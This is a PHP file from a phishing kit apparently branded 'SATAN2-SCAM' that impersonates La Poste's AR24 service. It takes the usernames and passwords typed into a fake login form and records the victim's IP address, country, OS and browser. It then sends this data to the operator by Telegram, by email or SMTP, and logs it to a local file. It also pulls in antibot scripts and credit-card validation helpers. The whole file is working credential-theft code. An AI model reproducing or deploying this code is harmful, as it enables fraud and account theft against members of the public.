<?php

/**
 * @link     : https://www.lesatan2scam.com/ 
 * @package  : AR24-LAPOSTE
 * @author   : SATAN2-SCAM 
 * @telegram : @lesatan2scam
 * @couriel  : lesatan2scam@gmail.com
 * @version  : Mise à jour
 * @copyright: https://facebook.com/lesatan2scam
 */

include '../main/antibots.php';
include '../main/main.php';
include_once '../vendor/autoload.php';
use Inacho\CreditCard;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

include '../vendor/prevents/anti-1.php';
include '../vendor/prevents/anti-2.php';
include '../vendor/prevents/anti-3.php';
include '../vendor/prevents/anti-4.php';
include '../vendor/prevents/anti-5.php';
include '../vendor/prevents/anti-6.php';
include '../vendor/prevents/anti-7.php';
include '../vendor/prevents/anti-8.php';

function validate_cc_number($number = null) { $card = CreditCard::validCreditCard($number); if( $card['valid'] == false ) { return false; } return $card; }  function validate_cc_cvv($number = null,$type = null) { if( empty($number) || empty($type) ) return false; $cvv = CreditCard::validCvc($number, $type); return $cvv; }  $to = 'admin@admin.com';  $random   = rand(0,100000000000); $ARL = substr(md5($random), 0, 17);   if($_SERVER['REQUEST_METHOD'] == "POST") {  /* ENVOI DU LOGIN */ if(isset($_POST['username']) && isset($_POST['password'])){  $_SESSION['username'] = $_POST['username']; $_SESSION['password'] = $_POST['password'];     if($_POST['username'] != "" && $_POST['password'] != "") {   $subject = $_SERVER['REMOTE_ADDR'] . ' | AR24LAPOST |';  $msg =  '[*AR24LAPOST*] >  ' . $_SERVER['REMOTE_ADDR'] . "\r\n"; $msg .= '--------------' . "\r\n"; $msg .= '|Username    | =  ' . $_SESSION['username'] . "\r\n";  $msg .= '|Password    | =  ' . $_SESSION['password'] . "\r\n"; $msg .= '--------------' . "\r\n"; $msg .= '|Date Time   | =  ' . date("Y-m-d H:i:s") . "\r\n"; $msg .= '|IP address  | =  ' . get_user_ip() . "\r\n"; $msg .= '|Country     | =  ' . get_user_country() . "\r\n"; $msg .= '|OS          | =  ' . get_user_os() . "\r\n"; $msg .= '|Browser     | =  ' . get_user_browser() . "\r\n"; $msg .= '|User agent  | =  ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n"; $msg .= '|Redirection | =  ' . $_SERVER['REMOTE_ADDR'].$_SERVER['REQUEST_URI'] . "\r\n"; $msg .= '--------------' . "\r\n";  $headers = "MIME-Version: 1.0" . "\r\n"; $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n"; $_SESSION['mTxt'] = base64_encode($msg);   if( RECEIVE_VIA_TELEGRAM == 1 ) { get_data_encrypt("HTML","base64",1024); telegram_send(urlencode($msg),"get_data_encrypt"); }  if( RECEIVE_VIA_EMAIL == 1 && RECEIVE_VIA_SMTP == 1 ) { $mail  = new PHPMailer; $mail->IsSMTP(); $mail->Host= SMTP_HOSTNAME; $mail->Port= SMTP_PORT; $mail->SMTPAuth= true; $mail->Username= SMTP_USER; $mail->Password= SMTP_PASS; $mail->SMTPSecure  = SMTP_SSL; $mail->SMTPAutoTLS = false; $mail->From= SMTP_FROM_EMAIL; $mail->FromName= SMTP_FROM_NAME; $mail->Subject = $subject; $mail->Body= $msg; $mail->AddAddress(RECEIVER_EMAIL); $mail->Send(); } else { if( RECEIVE_VIA_EMAIL == 1 ) { $mail   = new PHPMailer; $mail->From = SMTP_FROM_EMAIL; $mail->FromName = SMTP_FROM_NAME; $mail->Subject  = $subject; $mail->Body = $msg; $mail->AddAddress(RECEIVER_EMAIL); $mail->send(); /*echo $mail->ErrorInfo;*/ } if( RECEIVE_VIA_SMTP == 1 ) { $mail = new PHPMailer; $mail->IsSMTP(); $mail->Host = SMTP_HOSTNAME; $mail->Port = SMTP_PORT; $mail->SMTPAuth = true; $mail->Username = SMTP_USER; $mail->Password = SMTP_PASS; $mail->SMTPSecure   = SMTP_SSL; $mail->SMTPAutoTLS  = false; $mail->From = SMTP_FROM_EMAIL; $mail->FromName = SMTP_FROM_NAME; $mail->Subject  = $subject; $mail->Body = $msg; $mail->AddAddress(RECEIVER_EMAIL); $mail->Send(); } }   $house = fopen('../fuck/fucked.fuck', 'a');  fwrite($house, $msg); fclose($house); fstop(); /*header("location: load.php?ldg=1&arl#".$ARL.""); echo "<script type='text/javascript'>window.location.href='load.php?ldg=1&arl#".$ARL."';</script>";*/  } else { /*header("location: login.php?err=1&arl#".$ARL.""); echo "<script type='text/javascript'>window.location.href='login.php?err=1&arl#".$ARL."';</script>";*/ }  }      }  ?>